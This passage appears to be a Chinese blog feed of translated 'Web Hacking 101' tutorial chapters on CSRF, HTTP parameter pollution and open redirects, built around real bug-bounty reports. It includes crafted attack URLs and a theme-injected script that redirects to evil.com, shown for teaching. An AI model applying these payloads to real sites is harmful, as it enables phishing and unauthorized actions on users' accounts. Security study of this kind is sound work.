POST请求正文中，而不是URL中。使用代理，并检查访问站点或应用程序时正在调用的所有资源。 Burp允许您搜索所有代理历史记录以查找特定的值，这将显示此处JavaScript文件中包含的<code>rt</code>值。您可能会发现包含敏感数据（例如CSRF令牌）的信息泄漏。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>查找CSRF漏洞可能需要一些独创性和坚韧性来测试网站上的所有功能。通常，如果站点正在执行POST请求，则诸如Ruby on Rails之类的应用程序框架将越来越多地保护Web表单。但是，对于GET请求而言并非如此。因此，请务必注意任何更改服务器端用户数据的GET HTTP调用（例如断开Twitter帐户的连接）。另外，尽管我没有提供示例，但是如果您发现站点正在发送带有POST请求的CSRF令牌，则可以尝试更改CSRF令牌值或将其完全删除以确保服务器验证其存在。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part3 HTTP参数污染</title>
      <link href="part3-http-can-shu-wu-ran/"/>
      <url>part3-http-can-shu-wu-ran/</url>
      
        <content type="html"><![CDATA[<h1 id="Part3-HTTP参数污染"><a href="#Part3-HTTP参数污染" class="headerlink" title="Part3 HTTP参数污染"></a><center>Part3 HTTP参数污染</center></h1><p> <font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>HTTP参数污染（HPP）是操纵网站如何处理其在HTTP请求期间收到的参数的过程。当攻击者向请求中注入额外的参数并且目标网站信任它们时，就会发生此漏洞，从而导致意外行为。 HPP漏洞可能发生在服务器端或客户端。在客户端（通常是您的浏览器）上，您可以看到测试的效果。在许多情况下，HPP漏洞取决于服务器端代码如何使用作为参数传递的值，这些值由攻击者控制。因此，与其他类型的错误相比，发现这些漏洞可能需要更多的试验。</p><h2 id="服务器端HPP"><a href="#服务器端HPP" class="headerlink" title="服务器端HPP"></a>服务器端HPP</h2><p>在服务器端HPP中，您向服务器发送了意外的信息，以使服务器端的代码返回意外的结果。如part1所述，当您向网站发出请求时，站点的服务器将处理该请求并返回响应。在某些情况下，服务器不仅会返回网页，还会根据收到的信息运行一些代码。该代码仅在服务器上运行，因此基本上对您不可见：您可以看到发送的信息和返回的结果，但是中间的代码不可见。因此，您只能推断正在发生的事情。由于看不到服务器代码的功能，因此服务器端HPP取决于您确定潜在的易受攻击参数并进行试验。</p><p>让我们看一个例子：如果您的银行通过接受其服务器上处理的URL参数通过其网站启动转帐，则服务器端HPP可能会发生。想象一下，您可以通过在三个URL参数from，to和amount中输入值来转移资金。每个参数按顺序指定要从其转帐的帐号，要转帐的帐号和转帐金额。具有以下参数的URL会将$ 5,000从帐号12345转移到帐号67890，如下所示：</p><p><code>https://www.bank.com/transfer?from=12345&amp;to=67890&amp;amount=5000</code></p><p>银行可能会假设它将仅从参数中接收一个。但是，如果您提交两个，则会发生以下情况：</p><p><code>https://www.bank.com/transfer?from=12345&amp;to=67890&amp;amount=5000&amp;from=ABCDEF</code></p><p>该URL的初始结构与第一个示例相同，但附加了一个from参数，该参数指定另一个发送帐户ABCDEF。在这种情况下，攻击者将发送额外的参数，以希望应用程序使用第一个from参数来验证转移，但使用第二个参数来取款。因此，如果银行信任它收到的最后一个参数，则攻击者可能能够从他们不拥有的帐户执行转移。服务器端代码将使用第二个参数从帐户ABCDEF汇款到67890，而不是从帐户12345到帐户12345转移$ 5,000。</p><p>当服务器接收到多个具有相同名称的参数时，它可以通过多种方式进行响应。例如，PHP和Apache使用最后一次出现，Apache Tomcat使用第一次出现，ASP和IIS使用所有出现，依此类推。两位研究人员Luca Carettoni和Stefano di Paolo在AppSec EU 09大会上详细介绍了服务器技术之间的许多差异：此信息现在可在OWASP网站上找到，网址为<code>https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf</code>（请参见幻灯片9）。因此，没有一个单一的保证流程来处理具有相同名称的多个参数提交，并且发现HPP漏洞需要做一些试验来确认您正在测试的网站的工作方式。</p><p>银行示例使用了显而易见的参数。但是有时HPP漏洞是由于无法直接看到的代码隐藏的服务器端行为而发生的。例如，假设您的银行决定修改其处理转帐的方式，并更改其后端代码以在URL中不包含from参数。这次，银行将使用两个参数，一个参数用于转帐的目标账号，另一个参数用于转帐金额。要转移的帐户将由服务器设置，您看不到该帐户。一个示例链接如下所示：</p><p><code>https://www.bank.com/transfer?to=67890&amp;amount=5000</code></p><p>通常，服务器端代码对我们来说是一个谜，但是对于本示例而言，我们知道银行的（非常糟糕和冗余的）服务器端Ruby代码如下所示：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">user.account = 12345 def prepare_transfer(➊params)  ➋ params &lt;&lt; user.account  ➌ transfer_money(params) #params[2] =user.account (12345)end def transfer_money(params)  ➍ to = params[0]  ➎ amount = params[1]  ➏ from = params[2]   transfer(to,amount,from) end <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此代码创建两个函数prepare_transfer和transfer_money。 prepare_transfer函数采用名为params 的数组，该数组包含URL中的to和amount参数。该数组将为[67890,5000]，其中数组值夹在方括号之间，并且每个值都用逗号分隔。函数first的第一行将代码前面定义的用户帐户信息添加到数组的末尾。我们以params数组[67890,5000,12345]，然后将params传递给transfer_money➌。请注意，与参数不同，数组没有与它们的值关联的名称，因此代码取决于始终按顺序包含每个值的数组：要转移到的帐户是第一个，要转移的金额是下一个，要转移的帐户from跟紧其他两个值后面。在transfer_money中，随着函数将每个数组值分配给变量，值的顺序变得很明显。由于数组位置从0开始编号，因此params [0]访问数组中第一个位置的值（在这种情况下为67890），并将其分配给变量。然后将接下来的值分配给变量amount和from。然后，将变量名传递到此代码段中未显示的传递函数，该函数接受值并进行转账。</p><p>理想情况下，URL参数将始终按照代码期望的方式进行格式化。但是，攻击者可以通过将from值传递给params来更改此逻辑的结果，例如以下URL：</p><p><code>https://www.bank.com/transfer?to=67890&amp;amount=5000&amp;from=ABCDEF</code></p><p>在这种情况下，from参数也包含在传递给prepare_transfer函数的params数组中；因此，数组的值将为[67890,5000，ABCDEF]，将用户帐户添加为in将得到[67890,5000，ABCDEF，12345]。结果，在prepare_transfer中调用的transfer_money函数中，from变量将采用第三个参数，但它不是期望的user.account值（12345），而是攻击者传入的账号ABCDEF➍。</p><h2 id="客户端HPP"><a href="#客户端HPP" class="headerlink" title="客户端HPP"></a>客户端HPP</h2><p>客户端HPP漏洞使攻击者可以向URL中注入额外的参数，从而在影响用户端（客户端是指通常通过浏览器而非站点服务器） 。</p><p>Luca Carettoni和Stefano di Paola在其演示文稿中使用根据理论构造的URL <code>http：//host/page.php？par = 123％26action = edit</code>和以下服务器端代码，演示了此类操作的示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">➊ <span class="token operator">&lt;</span><span class="token operator">?</span> $val<span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'par'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span> ➋ <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/page.php?action=view&amp;par='.&lt;?=$val?&gt;.'"</span><span class="token operator">&gt;</span>View Me<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这段代码根据par的值（用户输入的参数）生成一个新的URL。 在此示例中，攻击者将值123％26action = edit作为par的值传递来生成附加的参数。 接下来，par被传递给函数htmlspecialchars➊。htmlspecialchars函数将特殊字符（如%26）转换为它们的HTML编码值，即将%26转换为&amp;，其中该字符可能具有特殊含义。转换后的值存储在$val中。然后通过将$val附加到位于➋的href值生成新链接。所以生成的链接会变成<code>&lt;a href=“/page.php？action=view&amp;par=123&amp;action=edit“&gt;</code>。因此，攻击者成功将附加action=edit添加到href，这可能会导致漏洞，具体取决于应用程序如何处理action参数。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><h3 id="HackerOne社交分享按钮"><a href="#HackerOne社交分享按钮" class="headerlink" title="HackerOne社交分享按钮"></a>HackerOne社交分享按钮</h3><p>难度：低</p><p>网址：<code>https：//hackerone.com/blog/introducing-signal-and-impact/</code></p><p>资料来源：<a href="https://hackerone.com/reports/105953/">https://hackerone.com/reports/105953/</a></p><p>报告日期：2015年12月18日</p><p>赏金支付：$ 500</p><p>查找HPP漏洞的一种方法是查找可能与其他服务联系的链接。 你可以在流行的社交媒体网站（例如Twitter，Facebook等）上通过包含链接以分享HackerOne的博客。在HackerOne的博客页面上单击“分享”，HackerOne将生成链接供用户在社交媒体上发布，发布的内容包括原始博客文章的URL。</p><p>该漏洞使您可以在HackerOne博客文章的URL上添加参数。添加的URL参数将反映在共享的社交媒体链接中，以便生成的社交媒体内容将链接到除预期的HackerOne博客URL之外的其他位置。</p><p>漏洞报告中使用的示例包含访问URL<code> https://hackerone.com/blog/introducing-signal</code>，然后在其末尾添加<code>＆u = https：//vk.com/durov</code>。在博客页面上，当HackerOne显示一个要在Facebook上共享的链接时，该链接将变为以下内容：</p><p><code>https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal？＆u = https：//vk.com/durov</code></p><p>如果HackerOne访问者在尝试共享内容时单击了此恶意链接，则最后一个u参数将优先于第一个u参数。随后，Facebook帖子将使用最后的u参数。然后，单击链接的Facebook用户将被定向到<code>https://vk.com/durov</code>而不是HackerOne。</p><p>此外，在发布到Twitter时，HackerOne会包含用于推广该帖子的默认tweet文本。攻击者还可以通过在URL中包含<code>＆text =</code>来操纵tweet文本内容，如下所示：</p><p><code>https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov＆text = another_site：https://vk.com/durov</code></p><p>当用户单击此链接时，他们将看到一个包含文本 <code>another_site：https://vk.com/durov</code>的推文弹出窗口，而不是宣传HackerOne博客的文本。</p><p><strong>重点</strong></p><p>当网站与另一个Web服务（例如社交媒体网站）关联并依靠当前URL生成要发布的内容时，请寻找漏洞的机会。在这个例子，提交的内容可能未经适当的安全检查就被传递，这可能导致参数污染漏洞。</p><h3 id="Twitter取消订阅通知"><a href="#Twitter取消订阅通知" class="headerlink" title="Twitter取消订阅通知"></a>Twitter取消订阅通知</h3><p>难度：低</p><p>网址：<code>https：//www.twitter.com/</code></p><p>资料来源：<a href="https://blog.mert.ninja/twitter-hpp-vulnerability/">https://blog.mert.ninja/twitter-hpp-vulnerability/</a></p><p>报告日期：2015年8月23日</p><p>赏金支付：700美元</p><p>在某些情况下，成功发现HPP漏洞需要坚韧不拔的精神。在2015年8月，黑客Mert Tasci在取消订阅接收Twitter通知时注意到了一个有趣的URL：</p><p><code>https://twitter.com/i/u?iid=F6542&amp;uid=1134885524&amp;nid=22+26&amp;sig=647192e86e28fb6691db2502c5ef6cf3xxx</code></p><p>注意参数UID。该UID恰好是当前登录的Twitter帐户的用户ID。在注意到UID之后，Tasci做了大多数黑客会做的事情——他试图将UID更改为另一个用户的UID，但是什么也没有发生。 Twitter只是返回了一个错误。</p><p>但是Tasci并没有气馁，继续研究，尝试添加第二个UID参数：</p><p><code>https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26&amp;sig=647192e86e28fb6691db2502c5ef6cf3xxx</code></p><p>这次成功了！他设法取消了其他用户的电子邮件通知订阅。 Twitter容易受到HPP退订用户的攻击。此漏洞值得注意的原因与SIG参数有关。事实证明，Twitter使用UID值生成SIG值。当用户单击取消订阅的URL时，Twitter将通过检查SIG和UID值来验证URL是否未被篡改。因此，在Tasci的开始的测试中，更改UID以取消订阅另一个用户失败，因为签名不再符合Twitter的期望。但是，通过添加第二个UID，Tasci成功地使Twitter使用第一个UID参数验证签名，但使用第二个UID参数执行取消订阅操作。</p><p><strong>重点</strong></p><p>Tasci的努力证明了坚持和知识的重要性。如果他在将UID更改为另一个用户并失败后就放弃了该漏洞，或者根本不知道HPP型漏洞，那么他将不会获得700美元的赏金。</p><p>另外，还要注意HTTP请求中包含的具有自动递增的整数（例如UID）的参数：许多漏洞涉及操纵此类参数值，以使Web应用程序以意外方式运行。</p><h3 id="Twitter-Web-Intents"><a href="#Twitter-Web-Intents" class="headerlink" title="Twitter Web Intents"></a>Twitter Web Intents</h3><p>难度：低</p><p>网址：<code>https：//twitter.com/</code></p><p>资料来源：<a href="https://ericrafaloff.com/parameter-tampering-attack-on-twitter-web-intents/">https://ericrafaloff.com/parameter-tampering-attack-on-twitter-web-intents/</a></p><p>报告日期：2015年11月</p><p>赏金支付：未公开</p><p>在某些情况下，HPP漏洞可能表示存在其他问题，并且可能导致发现其他错误。这就是Twitter Web Intents功能中发生的事情。该功能提供弹出流，用于在非Twitter网站的上下文中处理Twitter用户的推文，回复，转发推文，点赞和关注。 Twitter Web Intents使用户可以与Twitter内容进行交互，而无需离开页面或只为交互进行授权新应用程序。图3-1显示了这些弹出窗口之一的示例。</p><p><img src="/part3-http-can-shu-wu-ran/Part3-HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%5C6-3-1.jpg"></p><p>图3-1：Twitter Web Intents功能的早期版本，该功能使用户无需离开页面即可与Twitter内容进行交互。在此示例中，用户可以点赞杰克的推文。</p><p>通过测试此功能，黑客埃里克·拉法洛夫（Eric Rafaloff）发现，四种Intent类型（关注用户，点赞，转发和发推）都容易受到HPP的攻击。 Twitter将通过具有URL参数的GET请求创建每个Intent，如下所示：</p><p><code>https://twitter.com/intent/intentType?parameter_name=parameterValue</code></p><p>该URL将包括intentType和一个或多个参数名称/值对——例如，Twitter用户名和Tweet ID。 Twitter将使用这些参数来创建pop-up Intent，以显示要关注的用户或点赞的内容。 Rafaloff在创建以下带有两个screen_name参数的URL时发现了一个问题：</p><p><code>https://twitter.com/intent/follow?screen_name=twitter&amp;screen_name=ericrtest3</code></p><p>Twitter将通过在生成“关注”按钮时将使用第二个screen_name值（ericrtest3）而不是第一个值（twitter）。因此，试图关注Twitter官方帐户的用户会变成关注Rafaloff的测试帐户“ericrtest3”。访问Rafaloff创建的URL时，Twitter的后端代码使用两个screen_name参数生成以下HTML表单：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">➊&lt;form class =“ follow” id =“ follow_btn_form” action =“/intent/follow?screen_name = ericrtest3“ method =” post“&gt;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">hidden”</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">authenticity_token”</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">...”</span><span class="token punctuation">&gt;</span></span> ➋<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">hidden”</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">screen_name”</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">twitter”</span><span class="token punctuation">&gt;</span></span> ➌<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">hidden”</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">profile_id”</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">783214”</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">button”</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>“</span> <span class="token attr-name">submit”</span><span class="token punctuation">&gt;</span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span> &lt;/ b&gt; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">&gt;</span></span>关注&lt;/ strong&gt;   &lt;/ button&gt;  &lt;/ form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Twitter将使用来自第一个screen_name参数的信息，该参数与官方Twitter帐户相关联。</p><p>结果，目标用户将看到他们想要关注的用户的正确个人资料，因为URL的第一个screen_name参数用于在➋和➌处填充代码。但是，单击按钮后，目标将关注ericrtest3而不是twitter，因为form标记中的操作将改为使用传递给原始URL的第二个screen_name参数的值➊。</p><p>同样，在显示“点赞”的Intent时，Rafaloff发现他可以在url中包括screen_name参数，尽管它与点赞该推文没有任何关系。他创建了以下URL：</p><p><code>https://twitter.com/intent/like?tweet_i.d=6616252302978211845&amp;screen_name = ericrtest3</code></p><p>虽然intent仅需要tweet_id参数；但是，Rafaloff将screen_name参数注入到URL的末尾。这样就可以向用户显示正确的用户想要点赞的推文内容，但是，如果用户点了该推文的“关注”按钮，用户将关注“erictest3”而不是该推文的原作者。</p><p><strong>重点</strong></p><p>Twitter Web Intents漏洞类似于先前的UID Twitter漏洞。当站点容易受到HPP之类的漏洞的影响时，它可能表明存在更广泛的系统问题。有时，当您发现此类漏洞时，值得花时间全面探索该平台，看看是否还有其他地方可以利用类似行为。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HPP带来的风险取决于网站后端执行的操作以及使用污染参数的位置。</p><p>发现HPP漏洞需要进行彻底的测试，而对于其他一些漏洞的测试则需要更多的测试，因为我们通常无法访问收到HTTP请求后运行的代码服务器。这意味着我们只能推断站点如何处理传递给它们的参数。 </p><p>通过反复试验，您可能会发现HPP漏洞发生的情况。 通常，社交媒体链接是测试此漏洞类型的一个很好的首选，但切记在测试参数替换（例如类似ID的值）时，请继续挖掘并思考HPP。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> HPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part2 开放式重定向</title>
      <link href="part2-kai-fang-shi-chong-ding-xiang/"/>
      <url>part2-kai-fang-shi-chong-ding-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="Part2-开放式重定向"><a href="#Part2-开放式重定向" class="headerlink" title="Part2 开放式重定向 "></a><center>Part2 开放式重定向 </center></h1><p><font color="#A52A2A" size="4"><em>本文是Peter Yaworski的《Web Hacking 101》的翻译笔记，仅供参考学习，禁止二传。</em></font></p><p>开放重定向（Open Direct)利用对给定域名的信任来将目标引诱到恶意网站。网络钓鱼攻击伴随重定向，以欺骗用户，使用户认为他们的信息被发送到受信任的站点时，事实上他们正在将信息提交给恶意站点。</p><p>由于开放式重定向只会重定向用户，因此有时他们被认为影响不大不应受到赏金。OWASP是一个专注于应用程序安全性的社区，它整理了Web应用程序中最关键的安全漏洞列表，并从其2017年十大漏洞列表中删除了开放重定向。</p><p>尽管开放重定向是影响较小的漏洞，但它们对于学习浏览器通常如何处理重定向非常有用。</p><h2 id="开放式重定向的工作方式"><a href="#开放式重定向的工作方式" class="headerlink" title="开放式重定向的工作方式"></a>开放式重定向的工作方式</h2><p>当开发人员不信任攻击者控制的输入以将其重定向到另一个站点时，通常会通过URL参数，HTML <code>&lt;meta&gt;</code>刷新标签或DOM窗口位置属性来进行开放重定向。</p><p>许多网站通过将目标URL作为参数放置在原始URL中，有意地将用户重定向到其他站点。应用程序使用此参数来告诉浏览器将GET请求发送到目标URL。例如，假设Google具有通过访问以下URL将用户重定向到Gmail的功能：</p><pre class="line-numbers language-none"><code class="language-none">https://www.google.com/?redirect_to=https://www.gmail.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这种情况下，当您访问该URL时，Google会收到GET HTTP请求，并使用redirect_to参数的值确定将浏览器重定向到的位置。这样做之后，Google服务器会返回HTTP响应，并带有状态码，指示浏览器重定向用户。通常，状态代码为302，但在某些情况下，状态代码可能为301、303、307或308。</p><p>这些HTTP响应代码告诉您的浏览器已找到页面；但是，该代码还会通知浏览器对redirect_to参数的值<code>https://www.gmail.com/</code>发出GET请求，该值在HTTP响应的Location头中表示。 Location头指定将GET请求重定向到的位置。</p><p>现在，假设攻击者将原始URL更改为以下内容：</p><p><code>https://www.google.com/?redirect_to=https://www.attacker.com</code></p><p>如果Google未能验证redirect_to参数是否用于发送给合法站点之一，则攻击者可以用其自己的URL替换该参数。结果就是，HTTP响应可能指示您的浏览器向<code>https://www.attacker.com</code>发出GET请求。攻击者将您带到恶意站点之后，他们可以进行其他攻击。</p><p>寻找这些漏洞时，请留意包含某些名称的URL参数，例如url =，redirect =，next =等，它们可能表示用户将被重定向到的URL。另外请记住，重定向参数可能不一定总是被明确命名。参数会因站点而异，甚至在一个站点内也会有所不同。在某些情况下，参数可能仅用单个字符标记，例如r =或u =。</p><p>除了基于参数的攻击之外，HTML<code> &lt;meta&gt;</code>标记和JavaScript可以重定向浏览器。 HTML <code>&lt;meta&gt;</code>标签可以告诉浏览器刷新网页，并对标签的content属性中定义的URL发出GET请求。例如：</p><meta http-equiv="refresh" content="0; url=https://www.google.com/"><p>content属性定义浏览器如何通过两个步骤发出HTTP请求。首先，content属性定义浏览器在对URL发出HTTP请求之前要等待多长时间。在这个例子，为0秒。其次，content属性指定浏览器向其发出GET请求的网站中的URL参数；在这个例子里是<code>https://www.google.com</code>。攻击者可以在能够控制<code>&lt;meta&gt;</code>标记的content属性或通过其他漏洞注入自己的标记的情况下使用此重定向行为。 </p><p>攻击者还可以使用JavaScript通过文档对象模型（DOM）修改Window.location属性来重定向用户。 DOM是用于HTML和XML文档的API，允许开发人员修改网页的结构，样式和内容。由于location属性表示应将请求重定向到的位置，因此浏览器将立即解释此JavaScript并重定向到指定的URL。攻击者可以使用以下任何JavaScript来修改Window.location属性：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span>location <span class="token operator">=</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">www.google.com</span><span class="token regex-delimiter">/</span></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通常，只有在攻击者可以通过跨站点脚本漏洞执行JavaScript或网站故意允许用户定义要重定向的URL的情况下，才设置window.location值的机会才会出现，如稍后将看到的HackerOne插页式重定向漏洞。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><h3 id="Shopify主题安装开放重定向"><a href="#Shopify主题安装开放重定向" class="headerlink" title="Shopify主题安装开放重定向"></a>Shopify主题安装开放重定向</h3><p>难度：低</p><p>网址：<code>https：//apps.shopify.com/services/google/themes/preview/supply--blue？domain_name = &lt;anydomain&gt;</code></p><p>资料来源：<a href="https://www.hackerone.com/reports/101962/">https://www.hackerone.com/reports/101962/</a></p><p>报告日期：2015年11月25日</p><p>赏金支付：$ 500</p><p>第一个开放式重定向示例是在Shopify上找到的，Shopify是一个商务平台，用户可以创建商店来销售商品。 Shopify允许管理员通过更改主题来自定义商店的外观。作为该功能的一部分，Shopify提供了通过将商店所有者重定向到URL来提供主题预览的功能。重定向URL的格式如下：</p><p><code>https://app.shopify.com/services/google/themes/preview/supply--blue?domain_name=attacker.com</code></p><p>URL末尾的domain_name参数重定向到用户的商店域，并将/ admin添加到URL末尾。 Shopify认为domain_name始终是用户的商店，并且未验证其值是否属于Shopify域的一部分。结果，攻击者可以利用该参数将目标重定向到<code>http://&lt;attacker&gt;.com/admin/</code>。 </p><p><strong>重点</strong></p><p>并非所有漏洞都很复杂。对于此开放式重定向，只需将domain_name参数更改为外部站点即可将用户从Shopify重定向到其他位置。</p><h3 id="Shopify登录开放重定向"><a href="#Shopify登录开放重定向" class="headerlink" title="Shopify登录开放重定向"></a>Shopify登录开放重定向</h3><p>难度：低</p><p>网址：<code>http：//mystore.myshopify.com/account/login/</code></p><p>资料来源：<a href="https://www.hackerone.com/reports/103772/">https://www.hackerone.com/reports/103772/</a></p><p>报告日期：2015年12月6日</p><p>赏金支付：$ 500</p><p>开放重定向的第二个示例与第一个Shopify示例相似，不同的是，在这个例子，Shopify的参数不是将用户重定向到URL参数指定的域。而是开放式重定向会将参数的值添加到Shopify子域的末尾。通常，此功能将用于将用户重定向到给定商店的特定页面。但是，攻击者仍然可以通过添加字符来更改URL的含义，从而操纵这些URL将浏览器从Shopify的子域重定向到攻击者的网站。</p><p>在此漏洞中，用户登录Shopify后，Shopify使用参数<code>checkout_url</code>重定向。例如，假设某个目标访问了此URL：</p><p><code>http://mystore.myshopify.com/account/login?checkout_url=.attacker.com</code></p><p>它们将被重定向到非Shopify域的URL<code> http://mystore.myshopify.com.&lt;attacker&gt;.com</code>。</p><p>因为URL以<code>.&lt;attacker&gt;.com</code>结尾，并且DNS查找使用最右边的域标签，所以重定向将转到<code>&lt;attacker&gt;.com</code>域。因此，当提交<code>http://mystore.myshopify.com.&lt;attacker&gt;.com/</code>进行DNS查找时，它将与<code>&lt;attacker&gt; .com</code>匹配，而不是Shopify拥有的<code>myshopify.com</code>。尽管攻击者无法任意地将目标发送到任意地方，但他们可以通过在可以操纵的值上添加特殊字符（例如”.”）来将用户发送到另一个域名。</p><p><strong>重点</strong></p><p>如果您只能控制站点使用的URL的最后那部分，则添加特殊的URL字符可能会更改URL的含义并将用户重定向到另一个域。假设您只能控制<code>checkout_url</code>参数值，并且您还注意到该参数与网站后端的硬编码URL（例如商店URL<code> http://mystore.myshopify.com/</code>）组合在一起。尝试添加特殊的URL字符（例如，”.”或”@”），以测试是否可以控制重定向的位置。</p><h3 id="HackerOne插页式重定向"><a href="#HackerOne插页式重定向" class="headerlink" title="HackerOne插页式重定向"></a>HackerOne插页式重定向</h3><p>难度：低</p><p>网址：N / A</p><p>资料来源：<a href="https://www.hackerone.com/reports/111968/">https://www.hackerone.com/reports/111968/</a></p><p>报告日期：2016年1月20日</p><p>赏金支付：$ 500</p><p>一些网站试图通过实施插页式网页来防止打开的重定向漏洞，插页式网页在预期内容之前显示。每当您将用户重定向到URL时，您都可以显示一个插页式网页，并显示一条消息，向用户说明他们正在离开其所在的域。因此，如果重定向页面显示伪造的登录名或试图假装为可信域，则用户将知道他们正在被重定向。这是HackerOne在其网站上跟踪大多数URL时采用的方法。</p><p>尽管您可以使用插页式网页来避免重定向漏洞，但网站彼此交互方式的复杂性可能导致漏洞的出现。 HackerOne将Zendesk（客户服务支持票务系统）用于其<code>https://support.hackerone.com/</code>子域。当您在hackerone.com上使用<code>/zendesk_session</code>时，浏览器从HackerOne的平台重定向到没有插页页面的HackerOne的Zendesk平台，因为包含hackerone.com域的URL是受信任的链接。但是，任何人都可以创建自定义的Zendesk帐户和将它们传递给<code>/redirect_to_account?state =</code>参数。然后，自定义的Zendesk帐户可以重定向到非Zendesk或HackerOne拥有的另一个网站。因为Zendesk允许在没有插页式页面的帐户之间进行重定向，所以可以将用户带到不受信任的站点而不会发出警告。作为解决方案，HackerOne将包含<code>zendesk_session</code>的链接识别为外部链接，从而在单击时显示了一个插页式警告页面。</p><p>为了确认此漏洞，黑客Mahmoud Jamal在Zendesk上创建了一个子域为<code>http://compayn.zendesk.com</code>的帐户。然后，他使用Zendesk主题编辑器将以下JavaScript代码添加到了头文件中，该文件允许管理员自定义Zendesk网站的外观：</p><p><code>&lt;script&gt;document.location.href = "http://evil.com";&lt;/script&gt;</code></p><p>Jamal使用此JavaScript指示浏览器访问<code>http://evil.com</code>。 <code>&lt;script&gt;</code>标记表示HTML中的代码，document指的是Zendesk返回的整个HTML文档，这是网页的信息。Document后的点和名称是其属性。属性包含描述对象或可以操纵以更改对象的信息和值。因此，您可以使用<code>location</code>属性来控制浏览器显示的网页，并使用<code>href</code>子属性（这是location的属性）将浏览器重定向到定义的网站。访问以下链接会将目标重定向到Jamal的Zendesk子域，这使目标的浏览器运行Jamal的脚本并将其重定向到<code>http://evil.com：</code></p><pre class="line-numbers language-none"><code class="language-none">https://hackerone.com/zendesk_session?locale_id=1&amp;return_to=https://support.hackerone.com/ping/redirect_to_account?state = compayn:/<span aria-hidden="true" 